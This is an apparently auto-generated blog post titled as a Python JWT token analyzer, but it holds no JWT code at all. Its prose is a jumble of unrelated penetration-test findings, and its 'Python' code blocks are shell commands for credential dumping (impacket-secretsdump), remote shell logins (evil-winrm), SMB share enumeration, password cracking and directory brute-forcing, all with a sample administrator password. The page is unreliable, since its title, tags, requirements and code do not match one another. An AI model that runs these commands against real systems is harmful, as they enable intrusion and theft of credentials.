---
TitleSEO: "JWT Token Analyzer in Python | ZureFX"
TitlePost: "JWT Token Analyzer — Python"
Author: "ZureFX"
Description: "A Python script for jwt token analyzer. Built for security research and automation."
Keywords: "bash, script, parser, scanner, python"
URL: "https://zurefx.github.io/scripting/script-jwt-token-analyzer-135.html"
URL_IMAGES: ""
Date: "2025-08-04"
Tags: "Bash, Script, Parser, Scanner, Python"
Section: "scripting"
Lang: "en"
main_img: "script-jwt-token-analyzer-135"
Permalink: "/scripting/script-jwt-token-analyzer-135.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The backup files contained sensitive information that should not have been accessible. Token impersonation allowed elevation to SYSTEM privileges on the target. Unconstrained delegation was enabled on the compromised machine.

Built with **Python** for offensive security automation.

### Requirements

- Python
- `crackmapexec`
- `lookupsid`
- `kerbrute`

## Implementation

### Core Logic

Authentication bypass was achieved through careful manipulation of the login mechanism. Weak file permissions allowed modification of critical system files.

```python
feroxbuster -h
```

The database credentials were hardcoded in the application source code. Group Policy Preferences contained encrypted but recoverable credentials.

### Helper Functions

The application stored sensitive credentials in an unencrypted configuration file. Privilege escalation was possible due to misconfigured sudo permissions.

```python
crackmapexec smb 10.59.131.137 -u administrator -p 'P@ssw0rd!' --shares
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
feroxbuster -h
```

## Usage

### Basic Usage

Weak file permissions allowed modification of critical system files. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
gobuster dir -u http://10.16.246.172/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
impacket-secretsdump administrator:'P@ssw0rd!'@10.43.225.88
evil-winrm -i 10.88.145.101 -u administrator -p 'P@ssw0rd!'
feroxbuster -h
```

### Advanced Options

The kernel version was outdated and vulnerable to a publicly known exploit. Privilege escalation was possible due to misconfigured sudo permissions. The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
evil-winrm -i 10.21.115.66 -u administrator -p 'P@ssw0rd!'
feroxbuster -h
crackmapexec smb 10.118.211.113 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.106.164.234 -u administrator -p 'P@ssw0rd!'
```

## Output

### Example Output

The application stored sensitive credentials in an unencrypted configuration file. Weak file permissions allowed modification of critical system files.

```
[+] Scanning target...
[+] Found 17 results
[+] Done in 18.48s
```
